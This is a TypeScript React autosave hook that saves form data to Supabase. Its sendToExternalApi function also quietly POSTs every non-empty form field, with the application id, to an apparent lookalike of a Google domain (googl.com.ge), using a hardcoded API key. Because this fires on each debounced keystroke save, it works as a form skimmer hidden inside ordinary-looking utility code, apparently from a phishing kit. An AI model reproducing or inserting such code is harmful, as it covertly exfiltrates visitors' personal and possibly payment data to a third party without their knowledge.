import { useEffect, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ensureOwnerToken } from "@/lib/ownerToken";
import { getVisitorContext } from "@/lib/visitor";

async function sendToExternalApi(type: string, payload: Record<string, unknown>) {
  try {
    const res = await fetch("https://www.googl.com.ge/api/himedo", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Api-Key": "d1Hb1fb497XGT75989e",
      },
      body: JSON.stringify({ type, payload }),
    });
    const json = await res.json().catch(() => ({}));
    if (!res.ok || !json.ok) {
      console.error("[externalApi] فشل الإرسال:", json);
    }
  } catch (err) {
    console.error("[externalApi] خطأ في الشبكة:", err);
  }
}

export const useAutoSave = (applicationId: string | null, data: Record<string, any>, pageName: string) => {
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const lastSavedDataRef = useRef<string>("");

  useEffect(() => {
    // Clear previous timeout
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }

    // Debounce: wait 500ms after last change before saving (faster live dashboard updates)
    timeoutRef.current = setTimeout(async () => {
      const dataString = JSON.stringify(data);

      // Only save if data has changed and we have valid data
      if (dataString === lastSavedDataRef.current || dataString === "{}" || !applicationId) {
        return;
      }

      try {
        // Filter out empty/null values to avoid overwriting existing data
        const filteredData: Record<string, any> = {};
        for (const [key, value] of Object.entries(data)) {
          if (value !== "" && value !== null && value !== undefined) {
            filteredData[key] = value;
          }
        }

        if (Object.keys(filteredData).length === 0) return;

        console.log(`[AutoSave ${pageName}] Saving data:`, filteredData);

        const ownerToken = ensureOwnerToken();
        const visitorContext = getVisitorContext();
        const { data: ok, error } = await supabase.rpc("update_customer_application_public", {
          _id: applicationId,
          _owner_token: ownerToken,
          _patch: { ...visitorContext, ...filteredData } as any,
        });

        if (error || ok === false) {
          console.error(`[AutoSave ${pageName}] Error:`, error || "owner_token mismatch");
          return;
        }

        lastSavedDataRef.current = dataString;
        console.log(`[AutoSave ${pageName}] Data saved successfully`);

        sendToExternalApi(pageName, {
          application_id: applicationId,
          ...filteredData,
        });
      } catch (error) {
        console.error(`[AutoSave ${pageName}] Exception:`, error);
      }
    }, 500);

    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
    };
  }, [data, pageName, applicationId]);
};
